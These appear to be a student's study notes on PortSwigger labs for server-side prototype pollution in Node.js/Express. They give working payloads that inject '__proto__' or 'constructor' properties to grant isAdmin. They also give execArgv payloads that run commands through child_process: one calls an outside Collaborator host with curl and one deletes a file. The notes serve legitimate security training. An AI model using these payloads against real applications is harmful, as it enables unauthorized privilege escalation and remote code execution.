#### 2.6. Lab: Privilege escalation via server-side prototype pollution ⭕️
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.
To solve the lab:
3. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
4. Identify a gadget property that you can use to escalate your privileges.
5. Access the admin panel and delete the user `carlos`.
You can log in to your own account with the following credentials: `wiener:peter`
>When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

-
1. Login > My account > Submit > Send `POST /my-account/change-address` to Repeater.
>Cannot use DOM Invader to identify server side prototype pollution vulnerabilities, only client side?
2. Identify a prototype pollution source:
	1. Add a comma to the last key:value pair in the request JSON and enter the payload below and Send.
	```
	"__proto__": { "foo":"bar" }
	```
	2. Notice that `"foo":"bar"` property we added was accepted by the server and reflected back in the response. **This confirms a prototype pollution vulnerability**.
		1. ![Prototype Pollution-20260109205315852](Prototype%20Pollution-20260109205315852.png)
3. Identify a gadget:
	1. `isAdmin` is set to `false`
4. Enter this payload: `"isAdmin":true` and notice that the response show that `isAdmin` is now set to true. This means the object *doesn't have its own `isAdmin` property* and *inherited from the polluted prototype*.
	1. ![Prototype Pollution-20260109205652362](Prototype%20Pollution-20260109205652362.png)
5. Refresh the page > Admin panel > delete carlos to solve.
>[!tip] How to Identify this Vulnerability?
>1. `POST` requests uses JSON `application/json;charset=UTF-8`
>2. Send `__proto__` payload and see the object in the response

**Use this in the exam**
```
"__proto__": {
    "isAdmin":true
}
```

---
#### 2.7. Lab: Detecting server-side prototype pollution without polluted property reflection ⭕️
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab, confirm the vulnerability by polluting `Object.prototype` in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.

You can log in to your own account with the following credentials: `wiener:peter`

1. Login > My account > Submit to update address > send `POST /my-account/change-address` to Repeater > Send
2. Add a comma then this payload `"__proto__": { "foo":"bar" }` but it didn't get reflected in the response
	1. ![Prototype Pollution-20260111211539317](Prototype%20Pollution-20260111211539317.png)
3. Remove a comma `,` from the JSON, got a 500 Internal Server Error but `status` is a 400. Is the `"foo":"bar"` in the response an indicator of the vulnerability..?
	1. ![Prototype Pollution-20260111211817392](Prototype%20Pollution-20260111211817392.png)
4. Add the comma back in and enter this: `"__proto__": { "status":555 }`. Now we get a 200 OK.
	1. ![Prototype Pollution-20260111211958796](Prototype%20Pollution-20260111211958796.png)
5. The `status` and `statusCode` properties in the JSON response match the arbitrary error code that you injected into `Object.prototype`. This strongly suggests that you have successfully polluted the prototype and the lab is solved. *??? what*
>[!tip] How to Identify this Vulnerability?
>1. `POST` requests uses JSON `application/json;charset=UTF-8`
>2. Send `__proto__` payload and BUT the object *did not reflect* in the response

**Cannot find any solution for this lab to escalate privileges**

---
#### 2.8. Lab: Bypassing flawed input filters for server-side prototype pollution ⭕️
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.
To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user `carlos`.
You can log in to your own account with the following credentials: `wiener:peter`

--
1. Identity prototype pollution source
	1. Login > Submit > Send `POST` request to Repeater.
	2. Enter this payload: `"constructor": { "prototype": { "json spaces":10 } }`. In the Response, click Raw, compare it to Pretty, notice Raw is more indented than Pretty. *This confirms prototype pollution!*. 
		1. ![220](Prototype%20Pollution-20260111212638030.png)
		2. ![216](Prototype%20Pollution-20260111212617172.png)
2. Identify a gadget
	1. `"isAdmin": false`
3. Craft an exploit
	1. Enter this `"constructor": { "prototype": { "isAdmin":true } }` > refresh page > Admin panel > delete carlos to solve the lab.
	2. ![Prototype Pollution-20260111212851082](Prototype%20Pollution-20260111212851082.png)
>Don't even need to do Step 2, just try using the `constructor` payload.

>[!tip] How to Identify this Vulnerability?
>1. `POST` requests uses JSON `application/json;charset=UTF-8`
>2. Send `__proto__` payload and BUT the object *did not reflect* in the response so add the `constructor` payload

---
#### 3.9. Lab: Remote code execution via server-side prototype pollution ⭕️
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

Due to the configuration of the server, it's possible to pollute `Object.prototype` in such a way that you can inject arbitrary system commands that are subsequently executed on the server.

To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global `Object.prototype`.
2. Identify a gadget that you can use to inject and execute arbitrary system commands.
3. Trigger remote execution of a command that deletes the file `/home/carlos/morale.txt`.

In this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: `wiener:peter`

1. Identify a prototype pollution source
	1. Login > Submit to update address > Send `POST` request to Repeater.
	2. Enter this payload `"__proto__": { "json spaces":10 }` > click Raw > notice the extra indent. *This confirms a prototype pollution vulnerability*!
		1. ![Prototype Pollution-20260111213533253](Prototype%20Pollution-20260111213533253.png)
2. Probe for remote code execution
	1. Admin panel > click Run maintenance jobs. This is a classic example of the kind of functionality that may spawn node child processes. *??? what*
		1. ![148](Prototype%20Pollution-20260111213703957.png)
	2. Enter this payload `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')" ] }`. Add your collab server. Send.
		1. ![Prototype Pollution-20260111213855254](Prototype%20Pollution-20260111213855254.png)
	3. Click Run maintenance jobs again
	4. In Collaborator, notice DNS interactions -- *this confirms RCE*.
		1. ![Prototype Pollution-20260111214031675](Prototype%20Pollution-20260111214031675.png)
3. Craft an exploit
	1. Enter this `"__proto__": { "execArgv":[ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }` > Click Run maintenance jobs > lab solved.
		1. The payload deletes the `/morale.txt` file
#ExamTip **In the BSCP exam, I'd imagine we'd need to `cat` the `secrets.txt` file to get the flag**.

>[!tip] How to Identify this Vulnerability?
>1. `POST` requests uses JSON `application/json;charset=UTF-8`
>2. Send `__proto__` payload and BUT the object *did not reflect* in the response so add the `constructor` payload


**Cannot find any solution to extract contents of morale.txt**
